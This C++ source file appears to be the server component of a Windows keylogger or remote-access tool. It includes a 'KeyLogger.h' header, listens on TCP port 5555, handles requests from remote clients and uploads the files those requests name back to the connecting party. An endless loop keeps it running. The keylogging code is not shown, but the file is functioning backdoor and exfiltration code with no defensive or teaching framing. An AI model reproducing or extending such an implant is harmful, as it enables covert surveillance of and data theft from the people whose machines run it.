#undef UNICODE
#define WIN32_LEAN_AND_MEAN

#include <iostream>
#include <thread>
#include <atomic>
#include <cstring>

#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>

#include "KeyLogger.h"
#include "Server.h"
#include "common/Request.h"
#include "common/Utils.h"
#include "common/FileUpDownloader.h"

#define DEFAULT_PORT "5555"


SOCKET ListenSocket = INVALID_SOCKET;
atomic_bool stopServer;

void closeClientSocket(SOCKET ClientSocket) {
    int iResult = shutdown(ClientSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        printf("shutdown failed with error: %d\n", WSAGetLastError());
        closesocket(ClientSocket);
        WSACleanup();
        return;
    }

    // Close client socket
    closesocket(ClientSocket);
}

// TODO NOTIFY ON ERROR
int server() {
    int iResult;

    SOCKET ClientSocket = INVALID_SOCKET;

    struct addrinfo *result = NULL;
    struct addrinfo hints;

    int iSendResult;

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;

    // Resolve the server address and port
    iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result);
    if ( iResult != 0 ) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 1;
    }

    // Create a SOCKET for the server to listen for client connections.
    ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (ListenSocket == INVALID_SOCKET) {
        printf("socket failed with error: %ld\n", WSAGetLastError());
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }

    setSockOptions(ListenSocket);

    // Setup the TCP listening socket
    iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
        printf("bind failed with error: %d\n", WSAGetLastError());
        freeaddrinfo(result);
        closesocket(ListenSocket);
        WSACleanup();
        return 1;
    }

    freeaddrinfo(result);

    // Server Side
    std::cout << "Server started!\n";

    Server server;
    unique_ptr<char[]> recvbuf(new char[8192]());
    const int recvbuflen = 8192;

    // Server loop
    while (!stopServer) {
        iResult = listen(ListenSocket, SOMAXCONN);
        if (iResult == SOCKET_ERROR) {
            printf("listen failed with error: %d\n", WSAGetLastError());
            closesocket(ListenSocket);
            WSACleanup();
            return 1;
        }

        // Accept a client socket
        ClientSocket = accept(ListenSocket, NULL, NULL);
        if (ClientSocket == INVALID_SOCKET) {
            printf("accept failed with error: %d\n", WSAGetLastError());
            closesocket(ListenSocket);
            WSACleanup();
            return 1;
        }

        setSockOptions(ClientSocket);

        // Receive request
        PacketBuffer buffer(ClientSocket, true);
        Request request;
        Response response;
        request.deserialize(buffer);

        // Process request
        server.processRequest(request, response);

        // Send response
        buffer = PacketBuffer(ClientSocket, false);
        response.serialize(buffer);
        
        // shutdown the connection since we're done & close.
        closeClientSocket(ClientSocket);

        /* Upload Manager */
        Uploader uploader;
        for (const std::pair<std::string, std::string> &pr : response.getParams()) {
            if (!startsWith(pr.first, kFilePrefix)) {
                continue;
            }
           
            // Accept upload socket
            ClientSocket = accept(ListenSocket, NULL, NULL);
            if (ClientSocket == INVALID_SOCKET) {
                printf("accept failed with error: %d\n", WSAGetLastError());
                closesocket(ListenSocket);
                WSACleanup();
                return 1;
            }

            std::string filename = pr.first.substr(kFilePrefix.size());
            cout << "DEBUG: Uploading file " << filename << "\n";
            uploader.uploadFile(ClientSocket, filename);
            cout << "DEBUG: Uploaded file " << filename << "\n";
        }

        cout << "Finished downloading\n"; 
        uploader.joinThread(); 
    }

    closesocket(ListenSocket);

    return 0;
}

int main() {
    WSAData wsaData;
    // Initialize Winsock
    int iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    // Create folder "files"
    CreateDirectoryA("files", NULL);

    stopServer = false;
    thread serverThread(server);
    // serverThread.join();
    

    while (true) {
        
    }

    // cleanup
    WSACleanup();
    return 0;
}